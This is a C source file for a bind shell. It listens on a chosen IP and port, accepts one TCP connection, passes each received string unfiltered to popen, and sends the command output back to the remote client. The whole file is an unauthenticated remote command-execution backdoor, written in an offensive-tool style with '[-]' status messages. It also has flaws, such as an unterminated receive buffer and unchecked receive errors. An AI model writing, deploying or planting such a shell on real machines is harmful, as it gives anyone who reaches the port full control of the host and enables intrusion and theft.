#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <unistd.h>

int main(int argc, char *argv[]) {

    // Check args
    if (argc != 3) {
        printf("Usage: %s <Bind IP> <Bind Port>\n", argv[0]);
        exit(1);
    }

    char server_message[256] = "Start sending commands.\n";
    char command[256];

    // User specified IP and Port to bind
    in_addr_t ip = inet_addr(argv[1]);
    uint16_t port = htons(atoi(argv[2]));

    // Create socket
    int server_sock = socket(AF_INET, SOCK_STREAM, 0);

    // Build socket structure
    struct sockaddr_in server_address;
    
    // Socket type, port, and ip
    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = ip;
    server_address.sin_port = port;

    // Check socket created successfully
    if (server_sock < 0) {
        printf("[-] Socket error: %s", strerror(errno));
        exit(1);
    }
    else {
        if (bind(server_sock, (struct sockaddr*) &server_address, sizeof(server_address)) < 0) {
            printf("[-] Bind error: %s\n", strerror(errno));
            exit(1);
        }
        if (listen(server_sock, 1) < 0) {
            printf("[-] Listen error: %s\n", strerror(errno));
            exit(1);
        }

        int client_sock = accept(server_sock, NULL, NULL);
        // Send message
        if (client_sock < 0) {
            printf("[-] Accept error: %s\n", strerror(errno));
        }
        else {
            /* TCP options don't seem to work if connection is close from remote end with CTRL+C
            setsockopt(client_sock, SOL_SOCKET, SO_KEEPALIVE, 1, sizeof(int));
            setsockopt(client_sock, IPPROTO_TCP, TCP_KEEPIDLE, 10, sizeof(int));
            setsockopt(client_sock, IPPROTO_TCP, TCP_KEEPINTVL, 10, sizeof(int));
            setsockopt(client_sock, IPPROTO_TCP, TCP_KEEPCNT, 3, sizeof(int));
            send(client_sock, server_message, sizeof(server_message), 0);
            */
            while(1) {
                // Receive message from client
                int recv_len = recv(client_sock, command, 256, 0);
                printf("%s\n", command);
                if (recv_len < 0) {
                    printf("[-] Error receiving message: %s\n", strerror(errno));
                }
                else {
                    /*
                    // Store message into heap
                    char *local_command = malloc(recv_len + 1);
                    strncpy(local_command, command, recv_len);
                    local_command[recv_len] = '\0';
                    */

                    // Run command locally and store results
                    FILE *fp;
                    char results[1024];
                    fp = popen(command, "r");
                    if (fp == NULL) {
                        printf("[-] Error opening pipe\n");
                    }
                    while (fgets(results, sizeof(results), fp) != NULL) {
                        send(client_sock, results, strlen(results), 0);
                    }
                    
                    if (strcmp(command, "exit\n") == 0) {
                        close(client_sock);
                        break;
                    }

                    pclose(fp);
                    //free(local_command);
                }
            }
        }
    }

    if (close(server_sock) != 0) {
        printf("[-] Failed to close socket: %s\n", strerror(errno));
        exit(1);
    }

    return 0;
}